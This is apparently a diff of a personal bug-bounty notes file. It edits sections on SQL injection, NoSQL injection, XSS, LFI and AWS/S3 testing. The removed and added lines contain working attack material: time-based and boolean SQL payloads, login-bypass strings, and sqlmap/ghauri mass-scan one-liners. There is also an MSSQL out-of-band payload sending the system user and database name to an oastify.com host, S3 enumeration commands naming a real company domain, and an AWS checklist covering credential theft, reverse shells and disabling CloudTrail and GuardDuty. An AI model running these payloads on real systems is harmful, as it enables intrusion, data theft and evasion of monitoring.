@@ -7345,383 +7345,9 @@ $sql = "UPDATE users SET name='test' WHERE id='1338-1'"; will be executed as bei
    1234’ %2F%2A%2A%2FAnd%2F%2A%2A%2Fsleep(5)   on the resgiter page /// try other bypass if blocked by waf
    
   
+
+  
    
-#TIP 
-Found SQL Injection in [org_id] Cookie
-Payloads for Testing: 
--1 OR 0=6 AND 0-0=> FALSE 
--1 OR 6=6 AND 0-0=> TRUE
-
-#tip 
-Injected in request like this
-Cookie:organization_id=-1%20OR%200%3D6%20AND%200-0
-
-  #UniBox   
-  username field , you can place in any password
-   'or 1=1 limit 1-- -
-
-
-  TIP
-     **** #Tip  tip tip   in every comment 
-In a comment or picture that has an id, try create an imagery id and watch the response,  then try sql injection by    inserting 123456789 OR 1=1 into the  address bar as the pic_id parameter. 
-
-
-  #tip
-  Sql injection tutorial on Addslashes
-http://leettime.net/sqlninja.com/tasks/mics_ch6.php?id=1%af%5c'Union(select(1),version(),3,4,5,6,7,8)%23 
-   
-   #tip
-   Sending payload on burp within the URL/URI itself can also trigger SQL injection. So don't just focus on the parameters.
-   
-#tip
-  Note and tip
-  SQLi Tip - If you're able to find a JSON POST-based potential SQL injection (SQLi), remember to execute the SQLMAP query with -u and --data using JSON input. I've found more success using this method in SQLMap than when using a request file
-  
-#tip
-  SQLMap from Waybackurls
-waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"
-
-
- 
- 
----
-𝗧𝗶𝗺𝗲 𝗯𝗮𝘀𝗲𝗱 𝗦𝗤𝗟 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 𝗢𝗻𝗲𝗹𝗶𝗻𝗲𝗿
-cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt
- 
- 
- Always try the "\" character in login entries. It can trigger an SQL.
-
-curl -d 'username=1\&password=1\' -X POST https :// login(.)domain(.)com
-  
-  
-  #tip
-  python3 sqlmap.py -u https://www..gov./press-release-detail?id=6622 — batch — banner — dbs — dump-all technique=E — risk 3 — level 4 -v 3 — prefix="'(" — suffix="')" — flush-session — random-agent
-  
-  python3 sqlmap.py "https://www...x.x.x..com/en/login.php?destination=%2Forchis%2F6%3FPHPSESSID%3D&PHPSESSID=" — level=5 — risk=3 — banner — dump-all
- 
- 
- # Test case: Valid comment ID
-curl -X GET 'http://localhost:8000/comment?id=123'
-
-# Test case: Invalid comment ID
-curl -X GET 'http://localhost:8000/comment?id=invalid'
-
-# Test case: Non-existing comment ID
-curl -X GET 'http://localhost:8000/comment?id=999'
-
-# Test case: Error during execution
-curl -X GET 'http://localhost:8000/comment?id=123' -H 'X-Error-Simulate: true'
-# Test case: Valid request with all parameters
-curl -X POST 'http://localhost:8000/user' \
-  -H 'Content-Type: application/json' \
-  -d '{"name": "John Doe", "age": 30, "email": "john@example.com"}'
-
-# Test case: Request missing required parameter (name)
-curl -X POST 'http://localhost:8000/user' \
-  -H 'Content-Type: application/json' \
-  -d '{"age": 25, "email": "jane@example.com"}'
-
-# Test case: Request with only required parameter (name)
-curl -X POST 'http://localhost:8000/user' \
-  -H 'Content-Type: application/json' \
-  -d '{"name": "Jane Smith"}'
-
-# Test case: Request with invalid age value
-curl -X POST 'http://localhost:8000/user' \
-  -H 'Content-Type: application/json' \
-  -d '{"name": "Alice", "age": "twenty-five", "email": "alice@example.com"}'
-
-# Test case: Request with empty email
-curl -X POST 'http://localhost:8000/user' \
-  -H 'Content-Type: application/json' \
-  -d '{"name": "Bob", "age": 45, "email": ""}'
-
-
-
-  #tip 
-    https://github.com/ferreiraklet/Jeeves
-      cat sql_wordlist.txt | while read payload;do echo http://testphp.vulnweb.com/artists.php?artist= | qsreplace $payload | jeeves -t 5;done
-
-
-   5 COMMAND CAN HELP TO EASILY IDENTIFY SQL INJECTION       
-                                                         
-   1. sublist3r -d target | tee -a domains (you can use other tools like findomain, assetfinder, etc.)
-  2. cat domains | httpx | tee -a alive
-  3. cat alive | waybackurls | tee -a urls
-  4. gf sqli urls >> sqli
-  5. sqlmap -m sqli --dbs --batch
-  6. use tamper scripts
-  
-  
-  tip 
-  https://x.com/vulncure/status/1734908685103575408?s=20
-     
-           #or
-         use this
-            3 easy steps to get your first SQLi:
-
-1️⃣ Waybackurls: Gather all the possible url’s of a target.
-
-cat target.txt | waybackurls | tee urls.txt
-
-2️⃣ GF tool: Filter all the SQL parameters of a target and save it as any.txt.
-
-cat any.txt | gf sql > any.txt
-
-
-3️⃣ SQLmap: Send any.txt to SQLmap.
-
-python http://sqlmap.py -m any.txt  —risk 3 —batch
-
-💸 Alternatively use Gahuri to test the same
-     
-          
-     
-#tip
- boolean-based SQL injection payload
-      "XOR(if((select/**/666/**/where/**/1=1),444,0))XOR"       // This would result in a TRUE condition returning a response of ~21,000 bytes
-"XOR(if((select/**/666/**/where/**/1=2),444,0))XOR"             // This would result in a FALSE condition returning ~27,000 bytes
-
-
-
-
-#MORE-ABOUT-SQLMAP
-      https://medium.com/@cuncis/the-ultimate-sqlmap-tutorial-master-sql-injection-and-vulnerability-assessment-4babdc978e7d
-      
-        MODIFYING HTTP HEADERS AND COOKIES
-        to modify the User-Agent header to "Mozilla/5.0" 
-        sqlmap -u <target URL> --headers="User-Agent: Mozilla/5.0"
-        
-         to modify the PHPSESSID cookie to "12345" 
-         sqlmap -u <target URL> --cookie="PHPSESSID=12345"
-     
-      TAMPERING WITH REQUEST PARAMETERS
-      --data: This option allows you to set or modify the data sent in the request body during the scan. You can use it to modify parameters such as username, password, id
-      to modify the id parameter to "1' OR 1=1#"
-      sqlmap -u <target URL> --data="id=1' OR 1=1#"
-       sqlmap -u <target URL> --data="id=%27+OR+1%3D1--"                     //      Bypassing input filters
-       
-     sqlmap -u <target URL> --data="id=1' AND SLEEP(5)--"      using timebase , If a database has a firewall in place that blocks certain SQL commands or queries
-     sqlmap -r request.txt --random-agent --dbs --proxy=http://127.0.0.1:8080 --force-ssl --batch --risk 3 --level 3
-      
-      --tamper       This option allows you to use custom tampering scripts to modify the data sent in the request body.
-      sqlmap -u <target URL> --data="id=1' OR 1=1#" --tamper=apostrophemask.py
-        sqlmap -u <target URL> --data="id=1' OR 1=1#" --tamper=tamper/space2hash.py                         //      Bypassing input filters     WITH TAMPER 
-        
-        Error-Based Sql Injection🤑️
-        sqlmap -u "http://example.com/vulnerable.php?id=1" --technique E --dump
-      
-        
-        Blind SQL Injection
-       sqlmap -u "http://example.com/vulnerable.php" --data="username=admin&password=password" --technique B --string="Welcome, admin!" --not-string="Invalid login"
-                                  
-     
-    http://thegreycorner.com/2017/01/05/exploiting-difficult-sql-injection.html 
-    https://github.com/stephenbradshaw/pentesting_stuff/blob/master/helper_servers/sqlmap_secondorder_helper_server.py
-     NOTE
-  use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates
-  
-  Detection options
-     --string='Name\x0a\x09\x09Stephen'
-     
-     
-using GHARUI
-    Basic Scan with Custom User-Agent and Cookie:
-    ghauri -u https://www.site.com/vuln.php?id=1 --user-agent "mozilla/5.0" --cookie "PHPSSESSID=ABACE22333"
- 
- skipping URL Encoding of Payload Data:
-This command skips URL encoding of payload data while testing the 'id' parameter for SQL injection
- ghauri -u https://www.site.com/vuln.php?id=1 --p id --skip-urlencode
-   
-   fresh quieries
-    ghauri -u https://www.site.com/vuln.php?id=1 --fresh-queries
- 
- Testing Specific Parameter with Prefix and Suffix:
-  ghauri -u https://www.site.com/vuln.php?id=1  -p id --prefis "' or 1=1 --" --ssuffix "#"
-  
-   with tread
-    ghauri -u https://www.site.com/vuln.php?id=1 --threads 5
-     Custom Detection Criteria with HTTP Code:
-       ghauri -u https://www.site.com/vuln.php?id=1  --code 200 --string "welcome"
-       
-       
-    tip                              check more on this write up     https://infosecwriteups.com/i-earned-3500-and-40-points-for-a-graphql-blind-sql-injection-vulnerability-5b7e428c477d  
-    whenever you encounter internal server error while testing sql,  validate by sending by sending sql paylaod                        XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z                or 
-   payload 14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515  and test sqli on every sql query and also check the bytes
- 
-#tip  
- payload 14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515
- 
- #TIP
- SQL injection Oneliner.
- subfinder -dL domains.txt | dnsx | waybackurl | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
-findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
-
-grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
-
-    TIME-BASE SQL INJECTION
-gau DOMAIN.tld  | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done
-
-
-waybackurls http://TARGET.COM | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt 
-
- '"<svg/onload=prompt(5);>{{7*7}}
- 
- 
- SQL Injectjon for Contact/Registration Forms .
-
-1. sqlmap -u http://target.com/registration --dbs --forms --crawl=2
-2. it will crawl all the links having input field
-3. select the parameter you want to test
-
-
-Exploitation of mssql injection
-By appending the value ‘“”) to the parameter, I triggered an error revealing that the table name was too long, indicating the presence of a SQL injection vulnerability. Further refining the injection payload, I successfully balanced the query to execute arbitrary commands. For instance:
-
-“https://evil.com/path/test.aspx?fuzz=1')--+-"
-“https://evil.com/path/test.aspx?fuzz=1') and 1=@@version — +-
-
-
-  
-#TIP
-Find SQLi using Jeeves
-echo "http://exampl.com" | gf sqli | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 10
-
-  #tip
-  If you find sql injection and encounter a 403 or waf block, be sure to try tamper scripts and update your sqlmap
-Payload ; 
-sqlmap -r req.txt --risk 3 --level 3 --dbs --tamper=space2comment,space2morehash
-
-
-#tips
-  Step 1: Go admin login page                        https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
-
-Step 2: Now enter the payload in the username or password field,
-
-Payload Used: admin’ or ‘1’=’1'#
-
-Step 3: Enter the payload and click the submit button.
-
-Step 4 : Booooom!!! You Login successfully…
-
-
-
-
-
- TOP XOR BLIND PAYLOADS 
-
-0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X
-
-0"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z
-
-'XOR(if((select now()=sysdate()),sleep(10),0))XOR'Z
-
-X'XOR(if(now()=sysdate(),//sleep(5)//,0))XOR'X
-
-X'XOR(if(now()=sysdate(),(sleep((((5))))),0))XOR'X
-
-X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X
-
-'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z
-
-(SELECT(0)FROM(SELECT(SLEEP(6)))a)
-
-'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
-
-'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
-
-(SELECT * FROM (SELECT(SLEEP(5)))a)
-
-'%2b(select*from(select(sleep(5)))a)%2b'
-
-CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END
-
-');(SELECT 4564 FROM PG_SLEEP(5))--
-
-["')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23"]
-
-DBMS_PIPE.RECEIVE_MESSAGE(%5BINT%5D,5)%20AND%20%27bar%27=%27bar
-
-AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar
-
-1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK
-
-(select*from(select(sleep(20)))a)
-
-'%2b(select*from(select(sleep(0)))a)%2b'
-
-*'XOR(if(2=2,sleep(10),0))OR'
--1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//
-
-'+(select*from(select(if(1=1,sleep(20),false)))a)+'"
-
-2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)
-
-BENCHMARK(10000000,MD5(CHAR(116)))
-
-'%2bbenchmark(10000000%2csha1(1))%2b'
-
-'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(5),1)))a)--%20 - true
-
-polyglots payloads:
-
-if(now()=sysdate(),sleep(3),0)/'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"/
-
-if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"/ 
-
-
-
-  subfinder -d target[.]com -all -silent | hakrawler | urldedupe |gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 1 --level 5 --random-agent | tee -a sqli.txt
-  
-  payloads
-     admin';IF(97=97) WAITFOR DELAY '0:0:5' --820&TBPassword=
-     
-     admin'%3bIF(97=97)%20TAITFOR%20DELAY%20'0%3A0%3A5' --820&TBPassword=
-     
-admin';DECLARE @a varchar(1024);DECLARE @b varchar(1024);SELECT @a = (SELECT system_user);SELECT @b = (SELECT DB_NAME());EXEC('master..xp_dirtree "\\%c%' + @a + ' ' + '.' + '2svs73it2s6bhy1r9pghdhdhdh.oastify.com\test$"');--
-
-
-     
-
-  
-  
-  tip
-  always test sqli in parallel in any json object
-  
-  
-  tip
-  you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.
-
-These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT:
-<stockCheck>
-    <productId>123</productId>
-    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
-</stockCheck>
-
-  NOTE
-   For a UNION query to work, two key requirements must be met:
-
-    The individual queries must return the same number of columns.
-    The data types in each column must be compatible between the individual queries.
-
-To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:
-
-    How many columns are being returned from the original query.
-    Which columns returned from the original query are of a suitable data type to hold the results from the injected query.
-    
-    Determining the number of columns required
-                 injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.
-                 The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values: 
-                 
-                 
-    NOTE 
-    Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL , this involves using burp collaborator or ooast 
-
-
-
-
-
-
 
        SQL-WILDCARD-DOS-   
         
@@ -7746,8 +7372,23 @@ To carry out a SQL injection UNION attack, make sure that your attack meets thes
 4   %n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%
 5     %_[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[! -z]@$!_%
 6    '%%%%'
+       
+       
+       
+       tips  on sql injection                               https://x.com/bugoverfl0w/status/1751641500751139115
+       while browser I found a request, it is POST request with data JSON
 
+{"userName":"0a"} => response {"Exception":"No entity found for query"}
+Confirm SQLi by add ' after 0a
+{"userName":"0a'"}
 
+    Got response {"Exception":"org.hibernate.exception.SQLGrammarException: could not prepare statement"}  
+If I add ' or -- after 0a' => response like first request 
+=> confirm SQLI now try to find backend database  Next req:
+{"userName":"0a' or 1=1--"}
+       
+  
+  
        NOSQL INJECTION      NOSQL INJECTION       NOSQL INJECTION 
 
 POST /login HTTP/1.1 Host: vuln.lab Content-Type: application/json {“username”: “admin”,”password”: “mypass”}
@@ -7759,6 +7400,9 @@ POST /login HTTP/1.1 Host: vuln.lab Content-Type: application/x-www-form-urlenco
 
  In both the above cases, we’re able to bypass the login and access the application
        
+       
+     tip
+     Add parameters like $lookup, $unionWith, and $match to your wordlist for testing. Any errors or hits on these might give a hint to a potential NoSQL injection.
        
                  
                  
@@ -8200,8 +7844,8 @@ nuclei -t templates/subdomain-takeover.yaml -1 subdomains.txt
    using chaos, gospider, findomain, assetfinder, amass, httpx and anew for recon domain
    
    chaos -d example.com | gospider -s https://example.com | findomain -t example.com | assetfinder | amass intel -d example.com | hpptx -silent -thread 10 -status code 200 | anew | sort -u 
-   
-   
+
+
     ONELINER-SCRIPT-FOR-BUG-BOUNTY                  ONELINER-SCRIPT-FOR-BUG-BOUNTY                ONELINER-SCRIPT-FOR-BUG-BOUNTY
    
    
@@ -8253,12 +7897,6 @@ echo testphp.vulnweb.com|gau -subs|grep "https://" |grep -v "png\|jpg\|css\|js\|
 Content Discovery With Dirsearch Oneliner:
 dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json -u http://target
 
- SQLI Oneliner With Sqlmap:
-1 subfinder -d target.com|tee -a domains.txt
-2 cat domains.txt|httpx|tee -a urls-alive.txt
-3 cat urls-alive.txt|waybackurls|tee -a urls-check.txt
-4 gf sqli urls-check.txt >> sql.url
-5 sqlmap -m sql.url --dbs --batch
 
   
 
@@ -8277,10 +7915,8 @@ xss%27;eval.call`${%27alert\x28window.origin\x29%27}`;//
 "/><details/open/ontoggle=promt(1)>
 
 "onfocus="alert(1)"autofocus="abc
-      
 
-                 
-    LOCAL FILL INCLUSION
+     LOCAL FILL INCLUSION
    gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
    
    Open-redirect
@@ -8303,13 +7939,7 @@ xss%27;eval.call`${%27alert\x28window.origin\x29%27}`;//
    cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
    
    
-   
-   FIND JAVASCRIPT FILES     FIND JAVASCRIPT FILES    FIND JAVASCRIPT FILES
-   
-   assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
-   
-   EXTRACT ENDPOINTS FROM JAVASCRIPT   
-   cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
+
 
    
    
@@ -8395,7 +8025,11 @@ curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/dat
   
   
  
-  AWS  AND CLOUD TOOLS
+  AWS  AND CLOUD TOOLS                          AWS  AND CLOUD TOOLS                               AWS  AND CLOUD TOOLS
+  https://3bodymo.medium.com/how-i-earned-by-amazon-s3-bucket-misconfigurations-29d51ee510desite:*.*.*.redacted.com
+  https://satyasai1460.medium.com/how-js-file-helped-me-to-find-and-exploit-aws-access-key-and-secret-e09b4219831d
+  https://medium.com/bug-bounty-hunting/aws-top-10-vulnerabilities-fe5fa93bac64                      check  all  the aws top 10 if found your client using it // check for the labs and solve it 
+  
   https://github.com/mosesrenegade/PMapper
   For Amazon S3 buckets, try the “AWSBucketDump” tool by Jordan Potti  https://github.com/jordanpotti/AWSBucketDump 
 For DigitalOcean Spaces, try the “Spaces-Finder” tool by Appsecco: https://github.com/appsecco/spaces-finder 
@@ -8440,6 +8074,11 @@ html:"OpenSearch Dashboards"
 "X-Amz-Server-Side-Encryption"
 
 
+  intext:target inurl:s3.amazonaws.com
+  Azure Blob Storage: intext:target inurl:blob.core.windows.net
+  Google Cloud Storage: intext:target inurl:storage.googleapis.com
+
+
     Example Google Dorking Syntax
 site:websitename.com inurl:".s3.amazonaws.com"
 
@@ -8466,6 +8105,94 @@ site:websitename.com inurl:"storage.googleapis.com"
          aws s3api get-object --bucket huge-logistics-dashboard --key "static/js/auth.js" --version-id "qgWpDiIwY05TGdUvTnGJSH49frH_7.yh" old_auth.js --no-sign-request
          aws configure
 aws sts get-caller-identity [Checking Identity]
+
+  tip on finding s3 bucket
+ 1  A simple way to detect an S3 bucket is by examining the URLs associated with its files. When you encounter a file URL like
+https://<bucket-name>.s3-us-west-1.amazonaws.com/uploads/image.png
+, you can extract the base URL
+https://<bucket-name>.s3-us-west-1.amazonaws.com
+and browse the corresponding folder at
+https://<bucket-name>.s3-us-west-1.amazonaws.com/uploads/.
+This method allows you to visually explore the contents of the bucket using a web browser.
+
+2  visit   https://buckets.grayhatwarfare.com/results/colliershouston
+By searching for an organization's name, you can filter and browse through the contents of their open S3 buckets. This approach is valuable for research and identifying exposed data.
+
+3 use aws cli tools
+
+
+   tip  using burpsuite
+    capturing the request made when downloading a file:
+
+Access the website and initiate the download of the file (e.g., by clicking an image link). Burp Suite will intercept the request.
+Inspect the captured request in Burp Suite’s Proxy tab, analyzing the headers and URL to determine the source of the file.
+Look for indications within the request that suggest the file is being served from an S3 bucket, such as a URL containing “s3.amazonaws.com” or any custom domain associated with an S3 bucket.
+Inspect the response in Burp Suite’s Proxy tab, examining the headers and content to confirm if it is indeed being served from an S3 bucket.
+
+  using  
+   subfinder -d disney.com -all -silent | httpx -silent -webserver -threads 100 | grep -i AmazonS3
+
+subfinder -d disney.com -all -silent | httpx -silent -webserver -threads 100 -match-string "AccessDenied"
+
+use nuclie template 
+   https://github.com/projectdiscovery/nuclei-templates/blob/master/technologies/s3-detect.yaml
+  
+
+  
+
+
+
+
+
+
+             AWS PENETRATION TESTING CHECKLIST
+
+1-Test for Unauthenticated Bucket Access
+2-Test for Semi-Public Bucket Access - Improper ACL permission
+3-Targeting and compromising AWS Access keys in git commit
+4-Test for Extracting keys from an EC2 instance
+5-Exploiting AWS Security Misconfigurations
+6-Test to exploit EC2 instance
+7-Exploiting Internal AWS Services using Lambda backdoors
+8-Test for Subdomain Takeover
+9-Testing for AWS IAM Privilege Escalation
+10-Test for RCE attack
+11-Test for AWS Role Enumeration (IAM)
+12-Test for EC2 service to exploit privilege escalation
+13-Test for AWS Role enumeration - Bypassing CloudTrail Logging
+14-Test for Bitbucket Server data for credentials in AWS
+15-Test for rebinding to compromise the cloud environment
+16-Test for Change of local Windows / Linux logs
+17-Test to create jobs or serverless actions to add root certificates and ssh private keys to machines and users (such as AWS lambda)
+18-Test to Create an additional interface / assign an IP address in target network / subnet on a compromised machine (like assigning a secondary private IPv4 address or interface to an AWS EC2 instance
+19-Steal virtual machine images from storage accounts, analyze them for passwords, keys and certificates to access live systems (like VM VHD snapshots from storage accounts)
+20-Test to Gain OS level access to Instances/VMs via workload management service privileges (AWS SSM)
+21-Create systems management commands or abuse instance metadata for scheduled and triggered command and control (AWS systems manager, modify EC2 UserData to trigger a reverse shell)
+22-Test to Run or deploy a workload with an assigned/passed service or role, export instance credentials for other privileges (such as EC2 passed role and meta credentials)
+23-Fingerprint server and application versions and frameworks, detect sensitive PII in application logs
+24-Test for CSV injection in AWS CloudTrail
+25-Tested for AWS service abuse via meta-data
+26-Attempt load balancer MITM for session hijacking (elb) by cloud service configuration or load instance compromise
+27-Steal credentials from metadata of proxy or http forwarding servers (credentials in AWS meta
+28-Steal cloud workload credentials (AWS metadata SSM or Azure Linux Agent (waagent) folder credentials
+29-Steal credentials from or leverage privilege to operation of a cloud key service (aws kms, azure key vault
+30-Alter data in datastore for fraudulent transactions or static website compromise (s3, rds, redshift)
+31-Alter a serverless function, logic app or otherwise as business logic implementation for action on objective or escalation (AWS lambda or Azure logic apps)
+32-Alter data in local sql or mysql databases
+33-Operate in regions where logging is not enabled or disable global logging (like CloudTrail)
+34-Alter log files in a non-validated log store or disable validation (like cloud trail log validation)
+35-Tested for Disable network traffic analysis / logging (VPC flowlogs)
+36-Test for Disable Cloud alerting to prevent detection and response (like cloudwatch alerts, GuardDuty, Security Hub, or Azure Security Center)
+37-Tested for Disable data store access logging to prevent detection and response (cloudtrain data access, s3 access logging, redshift user activity)
+38-Alter log retention or damage the integrity of logs (s3 lifecycle, kms decryption cmk key deletion/role privilege lockout)
+39-Process hooking, process injection, windows access token manipulation, leveraging misconfigured sudo capabilities
+40-Test to Create or reset a login, access key or temporary credential belonging to a high privilege user (like iam
+, sts or iam
+)
+41-Test to Change the default policy for a user or new users to include additional privileges (like setdefault-policy-version)
+
+
+
 
 
 
@@ -8640,5 +8367,22 @@ Stay tuned for my API hacking post and let me know what I missed <3
 "Client-IP": "test{payload}",
 "X-Forwarded-Server": "test{payload}",
 "X-Arbitrary": "test{payload}",
-smart
 "X-Real-IP": "test{payload}"
+
+   
+   
+   
+      get all bbp 
+      bbscope bc -E "your_bugcrowd_email" -P "your_bugcrowd_password" -o u | tee bugcrowd-scope.txt
+        
+       
+        
+        
+        check this
+        Mastering Ghauri all techniques bypass
+3.Mastering SQLMAp all tampers and swithes
+
+
+
+
+     google vrp  disclse report 
